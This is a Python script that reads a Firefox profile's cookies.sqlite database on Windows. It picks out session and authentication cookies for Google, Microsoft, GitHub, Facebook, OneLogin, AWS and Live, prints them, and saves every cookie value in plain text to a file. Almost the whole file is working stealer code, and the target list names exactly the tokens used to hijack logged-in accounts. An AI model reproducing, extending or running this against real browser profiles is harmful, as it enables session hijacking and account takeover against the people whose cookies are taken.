# -*- coding: utf-8 -*-
"""
Created on Wed Jul 16 20:41:27 2024

@author: Mansoor Bukhari

"""    
import sqlite3
import os
from datetime import datetime

# Function to connect to the cookies database
def connect_to_cookies_db():
    home_dir = os.path.expanduser("~")
    profile = "jpb273b6.default-release"  # Replace with your Firefox profile folder
    firefox_path = os.path.join(home_dir, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles", profile)
    cookies_db_path = os.path.join(firefox_path, "cookies.sqlite")
    conn = sqlite3.connect(cookies_db_path)
    return conn

# Function to fetch cookies from the database
def fetch_cookies(conn):
    c = conn.cursor()
    c.execute("SELECT name, value, host, path, expiry FROM moz_cookies")
    cookies_data = c.fetchall()
    return cookies_data

# Function to filter and print cookies
def print_cookies(cookies_data, cookies_to_extract):
    for cookie in cookies_data:
        cookie_name = cookie[0]
        cookie_value = cookie[1]
        cookie_domain = cookie[2]
        cookie_path = cookie[3]
        cookie_expiry = cookie[4]

        for domain, cookie_names in cookies_to_extract.items():
            if cookie_domain.endswith(domain) and cookie_name in cookie_names:
                print(f"Cookie found: {cookie_name}={cookie_value} (Domain: {cookie_domain}, Path: {cookie_path}, Expires: {cookie_expiry})")

# Function to filter cookies by a date range
def filter_cookies_by_date(cookies_data, start_date, end_date):
    filtered_cookies = []
    for cookie in cookies_data:
        cookie_expiry = cookie[4]
        expiry_date = datetime.fromtimestamp(cookie_expiry)
        if start_date <= expiry_date <= end_date:
            filtered_cookies.append(cookie)
    return filtered_cookies

# Function to save cookies to a file
def save_cookies_to_file(cookies_data, filename):
    with open(filename, 'w') as file:
        for cookie in cookies_data:
            cookie_name = cookie[0]
            cookie_value = cookie[1]
            cookie_domain = cookie[2]
            cookie_path = cookie[3]
            cookie_expiry = cookie[4]
            file.write(f"Cookie: {cookie_name}={cookie_value}\n")
            file.write(f"  Domain: {cookie_domain}\n")
            file.write(f"  Path: {cookie_path}\n")
            file.write(f"  Expires: {datetime.fromtimestamp(cookie_expiry)}\n\n")

# Main function to run the script
def main():
    conn = connect_to_cookies_db()
    cookies_data = fetch_cookies(conn)

    # Define cookies to extract (example)
    cookies_to_extract = {
        ".amazon.com": ["aws-userInfo", "aws-creds"],
        ".google.com": ["OSID", "HSID", "SID", "SSID", "APISID", "SAPISID", "LSID"],
        ".microsoftonline.com": ["ESTSAUTHPERSISTENT"],
        ".facebook.com": ["cuser", "cs"],
        ".onelogin.com": ["session", "sub_session"],
        ".github.com": ["user_session"],
        ".live.com": ["RPSSecAuth"]
    }

    # Print cookies based on predefined criteria
    print_cookies(cookies_data, cookies_to_extract)

    # Example: Filter cookies by a date range (one year from now)
    start_date = datetime.now()
    end_date = start_date.replace(year=start_date.year + 1)
    filtered_cookies = filter_cookies_by_date(cookies_data, start_date, end_date)
    print("\nFiltered Cookies:")
    print_cookies(filtered_cookies, cookies_to_extract)

    # Save all cookies to a file
    save_cookies_to_file(cookies_data, "extracted_cookies.txt")
    print(f"\nAll cookies saved to 'extracted_cookies.txt'.")

    # Close connection
    conn.close()

# Entry point of the script
if __name__ == "__main__":
    main()
